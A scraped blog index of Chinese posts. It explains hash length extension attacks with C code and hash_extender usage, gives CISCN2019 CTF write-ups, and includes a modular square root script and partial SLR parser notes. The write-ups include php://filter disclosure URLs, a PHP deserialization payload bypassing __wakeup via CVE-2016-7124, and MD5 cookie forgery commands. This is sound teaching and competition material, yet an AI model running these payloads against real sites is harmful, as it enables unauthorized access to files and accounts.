printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } 运行：\n$ gcc -o hash_extension_1 hash_extension_1.c -lssl -lcrypto $ ./hash_extension_1 所以，服务器会检查我们发送的新数据，将它与上面的哈希值比对。现在，作为攻击者，我们要考虑的是如何生成这个值。\n客户端计算 # 怎么在不知道 secret 的情况下计算出那个值呢？\n首先，我们需要看一下我们要处理哪些数据：data, append, H, H(secret || data).\n我们需要定义新函数 H\u0026rsquo;，它与 H 使用同样的哈希函数，但开始状态是 H(secret || data) 的结束状态，即 signature。然后我们就只要计算 H'(append)，输出的就是我们要的哈希值。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;openssl/md5.h\u0026gt; int main(int argc, const char *argv[]) { int i; unsigned char buffer[MD5_DIGEST_LENGTH]; MD5_CTX c; MD5_Init(\u0026amp;c); MD5_Update(\u0026amp;c,\u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34;, 64); c.A = htonl(0x6036708e); /* \u0026lt;-- This is the hash we already had */ c.B = htonl(0xba0d11f6); c.C = htonl(0xef52ad44); c.D = htonl(0xe8b74d5b); MD5_Update(\u0026amp;c,\u0026#34;append\u0026#34;, 6); /* This is the appended data. */ MD5_Final(buffer, \u0026amp;c); for (i = 0; i \u0026lt; 16; i++) { printf(\u0026#34;%02x\u0026#34;, buffer[i]); } printf(\u0026#34;\\n\u0026#34;); return 0; } 运行：\n$ gcc -o hash_extension_2 hash_extension_2.c -lssl -lcrypto $ ./hash_extension_2 结果与刚才的哈希值一致，但是区别在于，我们根本没有用到 secret。简单地说：这段代码本质上就是用从新哈希值中得到的状态（四个链变量的值）去覆盖了四个初始链变量，随后再继续进行正常的哈希函数计算。\n结果 # 现在我们有字符串数据：\n0000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data............ 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P.......append 以及 H(secret || data || append) 的哈希值：\n6ee582a1669ce442f3719c47430dadee 并且，产生这一哈希值并不需要知道 secret 的值！我们发送这一数据，以及我们算出的新哈希值。服务器就会把 secret 放到前面，计算哈希，然后得到一个完全一致的哈希值，攻击完成。\n工具 # 使用方法：\n$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5 Type: md5 Secret length: 6 New signature: 6ee582a1669ce442f3719c47430dadee New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64 如果不清楚哈希函数的类型，可以尝试不同类型的函数，只要不设置 --format 参数即可。此时建议使用 --table 参数。\n$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --out-data-format html --table md4 89df68618821cd4c50dfccd57c79815b data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append md5 6ee582a1669ce442f3719c47430dadee data80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000P00000000000000append 关于输入输出的格式有很多选项，包括 HTML（使用 %NN 表示法），C 字符串（使用 \\xNN 表示法），十六进制表示等等。默认选项：\n输入数据：raw 输入哈希值：hex 输出数据：hex 输出哈希值：hex 帮助页面供参考：\n-------------------------------------------------------------------------------- HASH EXTENDER -------------------------------------------------------------------------------- By Ron Bowes See LICENSE.txt for license information. Usage: ./hash_extender \u0026lt;--data=|--file=\u0026gt; --signature= --format= [options] INPUT OPTIONS -d --data= The original string that we\u0026#39;re going to extend. --data-format= The format the string is being passed in as. Default: raw. Valid formats: raw, hex, html, cstr --file= As an alternative to specifying a string, this reads the original string as a file. -s --signature= The original signature. --signature-format= The format the signature is being passed in as. Default: hex. Valid formats: raw, hex, html, cstr -a --append= The data to append to the string. Default: raw. --append-format= Valid formats: raw, hex, html, cstr -f --format= [REQUIRED] The hash_type of the signature. This can be given multiple times if you want to try multiple signatures. \u0026#39;all\u0026#39; will base the chosen types off the size of the signature and use the hash(es) that make sense. Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool -l --secret= The length of the secret, if known. Default: 8. --secret-min= --secret-max= Try different secret lengths (both options are required) OUTPUT OPTIONS --table Output the string in a table format. --out-data-format= Output data format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy --out-signature-format= Output signature format. Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy OTHER OPTIONS -h --help Display the usage (this). --test Run the test suite. -q --quiet Only output what\u0026#39;s absolutely necessary (the output string and the signature) 其他工具有 HashPump 和 Hexpand 等，不过个人觉得不如 hash_extender 使用方便。\n防御 # 所以我们要如何防御这种攻击？实际上很简单，有两种方法：\n可以的话，尽可能不要使用加密的数据或签名来认证用户 如果必须使用，可以使用 HMAC 算法而不是自己写这种算法 HMAC 算法才是真正的解决之道，也就是将哈希值再哈希一次，如：H(secret || H(secret || data))。\n此外，还可以将 secret 放在数据末尾，也就是 H(data || secret)。由于服务器端会在末尾加 secret，原来的 attacker_controlled_data 就变成了 attacker_controlled_data || secret，由于不知道 secret，攻击者也不能再控制哈希值。\n参考资料 # 哈希长度拓展攻击 (Hash Length Extension Attacks) Everything you need to know about hash length extension attacks ","date":"2019-06-29","permalink":"/posts/hash-len-ext-atk/","section":"Posts","summary":"\u003cp\u003e简单翻译了 \u003ccode\u003ehash_extender\u003c/code\u003e 的 README 文档。\u003c/p\u003e","title":"画蛇添足：哈希长度扩展攻击"},{"content":"打完比赛就回去必修课期末考，于是现在才整理。这里只记录了少数几题的 writeup。\n初赛 # 签到 # 下载压缩包后解压得到 exe，运行后发现需要通过摄像头识别 3 个队员的人脸。识别成功后即得到 flag。\nSaleae # 下载文件后解压得到 saleae.logicdata，因此我们用 Logic 打开该文件，得到四信道的波形图：\n由于题目提示该波形图来自 U 盘，而且共有四个信道，因此猜想可能采用了 SPI 协议。在右侧 Analyzer 里新建分析器：\n这里主要需要确定的是四个信道是如何对应 SPI 协议的四信道的。观察波形：\n可以看到 Channel0 波形周期十分稳定，比较可能是 Clock；Channel1 持续低电平，可能是 Enable，或者 MOSI/MISO 二者之一。\nChannel2 波形较不规律，则必定是 MOSI/MISO 二者之一；Channel3 对应 Channel2 的那一段，两端恰好发生跳变，因此很有可能是 Enable。于是我们推出 Channel1 只能是 MOSI/MISO 二者之一。\n最终，我们发现这样的信道分配可以给出有用的信息：\n拼接成字符串即可得到 flag。\n24c # 同上题做法，根据波形猜测为 I2C 协议，载入模板可得：\nTime[s],AnalyzerName,DecodedProtocolResult 0.843705500000000,I2C,SetupWriteto[\u0026#39;160\u0026#39;]+ACK 0.843872000000000,I2C,\u0026#39;\u0026#39;+ACK 0.844038500000000,I2C,f+ACK 0.844205000000000,I2C,1+ACK 0.844371000000000,I2C,6+ACK 0.844537500000000,I2C,3+ACK 0.844704000000000,I2C,b+ACK 0.844870500000000,I2C,d+ACK 0.845036500000000,I2C,f+ACK 0.845203000000000,I2C,4+ACK 0.845369500000000,I2C,e+ACK 0.845536000000000,I2C,}+ACK 0.845702500000000,I2C,\u0026#39;0\u0026#39;+ACK 0.945796000000000,I2C,SetupWriteto[\u0026#39;160\u0026#39;]+ACK 0.945962500000000,I2C,\u0026#39;0\u0026#39;+ACK 0.946154000000000,I2C,SetupReadto[\u0026#39;161\u0026#39;]+ACK 0.946318000000000,I2C,f+ACK 0.946481500000000,I2C,l+ACK 0.946645000000000,I2C,a+ACK 0.946808500000000,I2C,g+ACK 0.946972000000000,I2C,{+ACK 0.947135500000000,I2C,c+ACK 0.947299500000000,I2C,4+ACK 0.947463000000000,I2C,6+ACK 0.947626500000000,I2C,d+ACK 0.947790000000000,I2C,9+ACK 0.947953500000000,I2C,e+ACK 0.948117500000000,I2C,1+ACK 0.948281000000000,I2C,0+ACK 0.948444500000000,I2C,-+ACK 0.948608000000000,I2C,e+ACK 0.948771500000000,I2C,9+ACK 0.948935500000000,I2C,b+ACK 0.949099000000000,I2C,5+ACK 0.949262500000000,I2C,-+ACK 0.949426000000000,I2C,4+ACK 0.949589500000000,I2C,d+ACK 0.949753000000000,I2C,9+ACK 0.949917000000000,I2C,0+ACK 0.950080500000000,I2C,-+ACK 0.950244000000000,I2C,a+ACK 0.950407500000000,I2C,8+ACK 0.950571000000000,I2C,8+ACK 0.950734500000000,I2C,3+ACK 0.950898000000000,I2C,-+ACK 0.951061500000000,I2C,4+ACK 0.951225000000000,I2C,1+ACK 0.951388500000000,I2C,c+NAK 5.946480500000000,I2C,SetupWriteto[\u0026#39;160\u0026#39;]+ACK 5.946647000000000,I2C,\\t+ACK 5.946813500000000,I2C,a+ACK 5.946980000000000,I2C,c+ACK 猜测 flag 为 flag{c46d9e10-e9b5-4d90-a883-41cf163bdf4e}，但提交提示错误。\n注意到最后三个字符 \\t a c，由于 \\t 出现在这里很违和，猜想这个字符并不代表字符本身，而是 ASCII 码对应的十六进制数（也就是 09）。结合 I2C 协议约定，猜测是将 flag 从第 9 位开始，用 ac 两个字符去覆盖掉原内容，于是得到：flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}，即最终 flag。\nusbasp # 下载文件后解压得到 usbasp.logicdata，因此我们用 Logic 打开该文件，得到四信道的波形图。由于共有四个信道，因此猜想可能采用了 SPI 协议。在右侧 Analyzer 里新建分析器：\n这里主要需要确定的是四个信道是如何对应 SPI 协议的四信道的。观察波形：\n可以看到 Channel2 波形周期十分稳定，比较可能是 Clock；Channel0 和 Channel1 没有特定的规律，因此应该分别是 MISO/MOSI 之一。于是 Channel3 应该是 Enable。\n此外，观察 Channel3，可以发现应该是高电平触发。最终，我们发现这样的信道分配和设置可以给出有用的信息：\n拼接成字符串即可得到 flag。\n居然能出三道差不多的题，而且号称是 IoT 题？？\nAsymmetric # （图片来自队友）\n其实就是变种 RSA，明白了这一点就容易了，但是坑点在于 python 中 long 和 bytes 互转的问题，推荐 python2 写：\nimport gmpy2 import random from Crypto.Util.number import * p=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867 p3 = p**3 p4 = p**4 def gcd(a,b): while a != 0: a,b = b%a, a return b def generate_key(nbit): e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979L pubkey = (long(e), long(p4)) return pubkey def findModReverse(a,m): if gcd(a,m) != 1: return None u1, u2, u3 = 1L, 0L, a v1, v2, v3 = 0L, 1L, m while v3 != 0: q = u3//v3 v1, v2, v3, u1, u2, u3 = (u1-q*v1), (u2-q*v2), (u3-q*v3), v1, v2, v3 return u1%m def crypt(msg, pkey): e, n = pkey m = bytes_to_long(msg) assert m \u0026lt; n -1 enc = pow(m, e, n) return long_to_bytes(enc) def decrypt(msg, pkey): e, n = pkey c = bytes_to_long(msg) d = findModReverse(e, p3*(p-1)) dec = pow(c, d, n) return long_to_bytes(dec) nbit = 1024 pubkey = generate_key(nbit) print \u0026#39;pubkey =\u0026#39;, pubkey cipher=\u0026#34;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0==\u0026#34; flag = decrypt(cipher.decode(\u0026#39;base64\u0026#39;),pubkey) print flag JustSoso # 查看源代码发现需要 hint.php，通过 php 伪协议转换为 Base64 编码获取：?file=php://filter/convert.base64-encode/resource=hint.php。\n对于 index.php 也同理：?file=php://filter/convert.base64-encode/resource=index.php。\n得到 index.php：\n以及 hint.php：\n从 hint.php 可以看出，Flag 类的 getFlag 函数最终会打印 flag，而该函数由 Handle 类调用。再审查 index.php，发现需要先 include 一下 hint.php，过滤后反序列化 payload。\n因此我们需要利用 php 反序列化漏洞，先构造 flag.php，即：newHandle(newFlag(“flag.php”))。\n然后我们需要绕过的过滤有：\npayload 中对 flag 的正则过滤； 绕过 __wakeup 函数中对 handle 置 null 的操作； 绕过代码中要求 md5 值相等的判断。 由 cve-2016-7124，我们知道，当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过 __wakeup() 的执行。\n因此我们在 payload 中需要注意：将 payload 中的 1 改为大于 1 的任意整数来跳过 __wakeup 函数，用 %00 填充 Handle，并令 token 等于 token_flag 的引用。最终 payload:\n///index.php?file=hint.php\u0026amp;payload=O:6:\u0026#34;Handle\u0026#34;:2:{s:14:\u0026#34;%00Handle%00handle\u0026#34;;O:4:\u0026#34;Flag\u0026#34;:3:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;flag.php\u0026#34;;s:5:\u0026#34;token\u0026#34;;N;s:10:\u0026#34;token_flag\u0026#34;;R:4;}} 浏览器中访问即可得到 flag。\n半决赛 # web6 # 本题存在 .git 仓库泄露，我们用 GitHack 提取文件：\n$ python GitHack.py http://172.29.12.114/.git/ 得到 getflag.php 和 index.html，显然只有前者有用。查看 getflag.php 源码：\n\u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; $user=$_POST[\u0026#39;user\u0026#39;]; function encrypt($text){ global $key; return md5($key.$text); } if (encrypt($user)===$_COOKIE[\u0026#39;verify\u0026#39;]) { if(is_numeric(strpos($user,\u0026#39;root\u0026#39;))){ die($flag); } else{ die(\u0026#39;not root！！！\u0026#39;); } } else{ setcookie(\u0026#34;verify\u0026#34;,encrypt(\u0026#34;guest\u0026#34;),time()+60*60*24); setcookie(\u0026#34;len\u0026#34;,strlen($key),time()+60*60*24); } //show_source(__FILE__); 我们想要进入 die($flag) 这一行，需要通过两个 if 判断，首先是要 encrypt 过后的 user 参数强等于 Cookie 中 verify 的值，后者是我们已知的（通过抓包获取，还可以知道 len 是 32）。接着要求 user 参数中包含 root 这个字符串。\n通过下方 setcookie(\u0026quot;verify\u0026quot;,encrypt(\u0026quot;guest\u0026quot;),time()+60*60*24); 这一行我们知道，verify 的值是 guest 经过 encrypt 后得到的，而 encrypt 中的全局变量 key 是我们无法得知的，因此无法强行计算 encrypt 这个函数的结果。换而言之，一个 32 位的 key 连接上 user 的 md5 值已知，而我们想构造出在 key 连接 user 再连接 root 后的新 md5 值，很容易想到哈希扩展攻击，构造 payload：\n$ ./hash_extender --data admin123 --secret 10 --append admin123 --signature e7187cb49ce6d5958d279284af968254 --format md5 得到：\n最后，用 URL 解码后的 New string 作为 user 参数的值，用 New signature 替换 verify 的值，即可得到 flag：\nweb3 # 首先访问 robots.txt 得到：\nUser-agent: Baiduspider Disallow: /bdhfyusdf Disallow: /index? Disallow: /flaggalf? Disallow: /Are you OK? Disallow: /NEWbi? Disallow: /ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.php? Disallow: /google Disallow: /PrivatePhotos 其中能访问的只有 http://172.29.12.111/ndsufbewhjubdvse/niubi/ii4375uhnfsv/admin.php。访问后看到一个登陆页面，burp 抓包发现 Cookie 中存在一个特殊的字段：\nhash_key=e7187cb49ce6d5958d279284af968254; source=0 观察发现是 32 位，猜想是 md5 值。但是到这里为止很难再进一步分析。于是我们扫描当前目录，发现了 License.txt：\n$flag = \u0026#34;flag{xxxxxx_just_a_sample_xxxxxxx}\u0026#34;; $bisskey = \u0026#34;xxxxxxxxx_just_a_sample_xxxxxxx\u0026#34;; // To remember Easily, 10 chars allowed. $username = $_POST[\u0026#34;username\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; header(\u0026#34;hash_key:\u0026#34; . $hash_key); if (!empty($_COOKIE[\u0026#34;MyIdentity\u0026#34;])) { if (urldecode($username) === \u0026#34;admin123\u0026#34; \u0026amp;\u0026amp; urldecode($password) != \u0026#34;admin123\u0026#34;) { if ($_COOKIE[\u0026#34;MyIdentity\u0026#34;] === md5($bisskey . urldecode($username .$password))) { echo \u0026#34;Great! You win!\\n\u0026#34;; echo (\u0026#34;\u0026lt;!-- Y0ur f!4g 1s here\u0026#34;. $flag . \u0026#34;--\u0026gt;\u0026#34;); } else { die (\u0026#34;I don\u0026#39;t konw what you say!\u0026#34;); } } else { die (\u0026#34;I don\u0026#39;t konw what you say!\u0026#34;); } } setcookie(\u0026#34;hash_key\u0026#34;, md5($bisskey . urldecode(\u0026#34;admin123\u0026#34;.\u0026#34;admin123\u0026#34;)), time() + (60 * 60 * 24 * 7)); 这里接收 username 和 passwd 参数，并要求 MyIdentity 非空的情况下 username 强等于 admin123 且 passwd 经过 URL 解码不等于 admin123。最后一层 if 是要求 MyIdentity 的值等于未知的长度为 10 的 bisskey 连接上 username 和 passwd 的 md5 值，显然这个我们也很难计算，但是类似 web6，我们可以用哈希扩展攻击的方法得到 flag：\n剩余的一些做出来的题，感觉记录的意义不大就没有记录下来。\n","date":"2019-06-28","permalink":"/posts/ciscn2019/","section":"Posts","summary":"\u003cp\u003e打完比赛就回去必修课期末考，于是现在才整理。这里只记录了少数几题的 writeup。\u003c/p\u003e","title":"CISCN2019 初赛+半决赛部分题解"},{"content":"","date":"2019-05-22","permalink":"/tags/%E5%BF%AB%E9%80%9F%E5%B9%82/","section":"Tags","summary":"","title":"快速幂"},{"content":"参考了陈恭亮《信息安全数学基础》第二版上的算法。\n囊括了快速幂运算（模重复平方计算法）和求逆元（扩展欧几里得算法）两个经典的初等数论算法。模 p 平方根算法是用来求解形如 $x^2 \\equiv a (mod\\ p)$ 的二次同余式，其中 $p$ 为素数，且 $(\\frac{a}{p}) = 1$。\ndef quick_pow(a, b, p): ret = 1 a %= p while b: if b\u0026amp;1: ret = (ret * a) % p b \u0026gt;\u0026gt;= 1 a = (a * a) % p return ret def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(\u0026#39;Modular inverse does not exist\u0026#39;) else: return x % m a, p = map(int, input(\u0026#39;Please input a, p such that x^2 = a (mod p). Input \\\u0026#39;-1 -1\\\u0026#39; to use default values: \u0026#39;).split()) if a == -1 and p == -1: a, p = 315, 907 if quick_pow(a, (p-1) // 2, p) != 1: print(\u0026#39;No valid solution.\u0026#39;) exit(1) s, t = p-1, 0 while (s\u0026amp;1) == 0: t += 1 s \u0026gt;\u0026gt;= 1 print(\u0026#39;p-1 = %d = 2^%d * %d\u0026#39; % (p-1, t, s)) b = quick_pow(3, s, p) print(\u0026#39;t = %d, s = %d, b = 3^s (mod p) = %d (mod p)\u0026#39;% (t, s, b)) _a = modinv(a, p) x = quick_pow(a, (s+1) // 2, p) print(\u0026#39;x_%d = %d (mod p), inv(a) = %d (mod p)\u0026#39;% (t-1, x, _a)) print() for k in range(1, t): res = 1 if quick_pow(_a * x ** 2, 2 ** (t-k-1), p) == 1 else -1 print(\u0026#39;(inv(a) * (x_%d)^2) ^ (2^%d) = %d (mod p)\u0026#39;% (t-k, t-k-1, res)) j = 0 if res == 1 else 1 x = (x * b**(j * 2**(k-1))) % p print(\u0026#39;j_%d = %d, x_%d = x_%d * b ^ (j_%d * 2^(%d)) = %d (mod p)\u0026#39;% (k-1, j, t-k-1, t-k, k-1, k-1, x)) print() print(\u0026#39;x_0 = %d (mod p), x_0\\\u0026#39;= %d (mod p)\u0026#39;% (x, p-x)) ","date":"2019-05-22","permalink":"/posts/mod-p-sqrt/","section":"Posts","summary":"\u003cp\u003e参考了陈恭亮《信息安全数学基础》第二版上的算法。\u003c/p\u003e","title":"模 p 平方根算法"},{"content":"天 坑 预 警\n概述 # 这次需要用 SLR(1) 方法也就是自底向上的方法实现语法分析器，并且需要识别并改正简单的语法错误（这里只出现了漏分号的错误）。举个栗子，输入：\n{ while (ID == NUM) { ID = NUM } } 需要按这个格式输出：\n语法错误，第 4 行，缺少 \u0026#34;;\u0026#34; program =\u0026gt; compoundstmt =\u0026gt; {stmts} =\u0026gt; {stmt stmts} =\u0026gt; {stmt} =\u0026gt; {whilestmt} =\u0026gt; {while ( boolexpr) stmt } =\u0026gt; {while ( boolexpr) compoundstmt } =\u0026gt; {while ( boolexpr) {stmts} } =\u0026gt; {while ( boolexpr) {stmt stmts} } =\u0026gt; {while ( boolexpr) {stmt} } =\u0026gt; {while ( boolexpr) {assgstmt} } =\u0026gt; {while ( boolexpr) {ID = arithexpr ;} } =\u0026gt; {while ( boolexpr) {ID = multexpr arithexprprime ;} } =\u0026gt; {while ( boolexpr) {ID = multexpr ;} } =\u0026gt; {while ( boolexpr) {ID = simpleexpr multexprprime ;} } =\u0026gt; {while ( boolexpr) {ID = simpleexpr ;} } =\u0026gt; {while ( boolexpr) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop arithexpr) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop multexpr arithexprprime) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop multexpr) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop simpleexpr multexprprime) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop simpleexpr) {ID = NUM ;} } =\u0026gt; {while ( arithexpr boolop NUM) {ID = NUM ;} } =\u0026gt; {while ( arithexpr == NUM) {ID = NUM ;} } =\u0026gt; {while ( multexpr arithexprprime == NUM) {ID = NUM ;} } =\u0026gt; {while ( multexpr == NUM) {ID = NUM ;} } =\u0026gt; {while ( simpleexpr multexprprime == NUM) {ID = NUM ;} } =\u0026gt; {while ( simpleexpr == NUM) {ID = NUM ;} } =\u0026gt; {while ( ID == NUM) {ID = NUM ;} } CFG、起始符、保留字与上一篇 LL 语法分析器 相同。\n思路与代码 # 很容易发现，LL 语法分析器中的一些已经确认正确的函数在这里可以使用，例如 compute_first 和 compute_follow 等。因此这次我们将基于 LL 语法分析的代码进行修改。\n准备工作 # 存储上不需要太多变化。对于规则的存储，因为这次在推导 LR(0) 项目集时，规则需要是有序的（为什么？），因此 multimap 可以换成 vector\u0026lt;pair\u0026lt;string, string\u0026gt; \u0026gt;。\nconst vector\u0026lt;pair\u0026lt;string, string\u0026gt; \u0026gt; rules = { {\u0026#34;program\u0026#39;\u0026#34;,\u0026#34;program\u0026#34;}, {\u0026#34;program\u0026#34;, \u0026#34;compoundstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;ifstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;whilestmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;assgstmt\u0026#34;}, {\u0026#34;stmt\u0026#34;, \u0026#34;compoundstmt\u0026#34;}, {\u0026#34;compoundstmt\u0026#34;, \u0026#34;{ stmts}\u0026#34;}, {\u0026#34;stmts\u0026#34;, \u0026#34;stmt stmts\u0026#34;}, {\u0026#34;stmts\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;ifstmt\u0026#34;, \u0026#34;if ( boolexpr) then stmt else stmt\u0026#34;}, {\u0026#34;whilestmt\u0026#34;, \u0026#34;while ( boolexpr) stmt\u0026#34;}, {\u0026#34;assgstmt\u0026#34;, \u0026#34;ID = arithexpr ;\u0026#34;}, {\u0026#34;boolexpr\u0026#34;, \u0026#34;arithexpr boolop arithexpr\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026lt;\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026gt;\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026lt;=\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;\u0026gt;=\u0026#34;}, {\u0026#34;boolop\u0026#34;, \u0026#34;==\u0026#34;}, {\u0026#34;arithexpr\u0026#34;, \u0026#34;multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;+ multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;- multexpr arithexprprime\u0026#34;}, {\u0026#34;arithexprprime\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;multexpr\u0026#34;, \u0026#34;simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;* simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;/ simpleexpr multexprprime\u0026#34;}, {\u0026#34;multexprprime\u0026#34;, \u0026#34;E\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;ID\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;NUM\u0026#34;}, {\u0026#34;simpleexpr\u0026#34;, \u0026#34;( arithexpr)\u0026#34;} /*{\u0026#34;e\u0026#39;\u0026#34;,\u0026#34;e\u0026#34;}, {\u0026#34;e\u0026#34;, \u0026#34;e + t\u0026#34;}, {\u0026#34;e\u0026#34;, \u0026#34;t\u0026#34;}, {\u0026#34;t\u0026#34;, \u0026#34;t * f\u0026#34;}, {\u0026#34;t\u0026#34;, \u0026#34;f\u0026#34;}, {\u0026#34;f\u0026#34;, \u0026#34;( e)\u0026#34;}, {\u0026#34;f\u0026#34;, \u0026#34;id\u0026#34;}*/ }; 与 LL 语法分析类似，由易到难总是能减轻一些工作量，因此最后被注释掉的部分是我们引入的一个更简单的 CFG，用于方便地进行正确性测试。注意这次多了一条规则 program'-\u0026gt; program，这是 LR 分析需要的增广文法。\n终结符与非终结符的存储不变，除了增加了一个非终结符 program'。\nFIRST 集和 FOLLOW 集的存储不变。\n最后是存储 LR 分析表，分为 action 表和 goto 表。goto 表由于只有需要 goto 的状态的数字，用二维 int 数组是很自然的想法。而 action 表需要存储 s_n 和 r_n 这两种表项（n 为数字），如果用字符串存储那么在查询表项时还需要进行一次字符串处理（找出是 shift 还是 reduce，以及对应的数字），十分麻烦。\n但是由于只有 shift 和 reduce 两种操作，我们可以全部采用 int 存储，然后借助数字的正负判断该操作是 shift 还是 reduce。\n计算 FIRST 集和 FOLLOW 集 # 在 SLR(1) 语法分析中只需要 FOLLOW 集，然而要计算 FOLLOW 集是需要一部分特定的 FIRST 集的。因此我们还是两者都要算。\n原理没有变，代码其实也没有太大的变化。唯一需要注意的是，由于 LR 分析中可能遇到左递归文法（例如用来测试的 CFG），相应 FIRST 集的计算会陷入死循环。解决方法是懒计算 FIRST 集，即并不对 FIRST 集进行预计算，而是在计算 FOLLOW 集过程中需要对应 FIRST 集时才做计算，这样可以有效避开死循环的问题。\n因此，FIRST 集在主函数中只做基本的初始化：\n// Init FIRST str_set tmp; for (const auto \u0026amp;expr: t) { tmp.clear(); tmp.insert(expr.first); FIRST.insert(make_pair(expr.first, tmp)); } FOLLOW 集中的变化：\n//first_beta = FIRST[next_str(sspair.second, end+1)]; first_beta = compute_first(next_str(sspair.second, end+1)); 测试函数不变。\n闭包函数 # 闭包有两种计算方法：循环和递归。在被看似优雅的递归坑过后，我知道为什么推荐的方法是循环了。 可能是被 FIRST 集和 FOLLOW 集的递归算法坑得还不够惨。\n我们知道，状态 I 的闭包首先包括本身，随后对于 I 中任意的规则 A -\u0026gt; aa.Bbb，B 是非终结符且 B -\u0026gt; y1 | y2 | ... | yn，有 B -\u0026gt; .y1 | .y2 | .... | .yn 也属于 I 的闭包。那么问题来了，A 能否等于 B？\n最初，我以为是不可以的，因为我忽略了 aa 的存在，认为这种规则存在左递归，因此应该立即停止递归运算。然而，aa 的存在允许了 A = B 的成立，此时继续递归并不会无限循环。\n排掉这个雷后，代码没什么难的了：\n/* Compute the closure of a state recursively */ State closure(State I) { State ret = I; State tmp; string non_terminal; for (const Rule \u0026amp;rule: I) { // A -\u0026gt; xx.Bxx exists in I, and \u0026#34;. is at head while A = B\u0026#34; is not true in case of right recursive CFG if 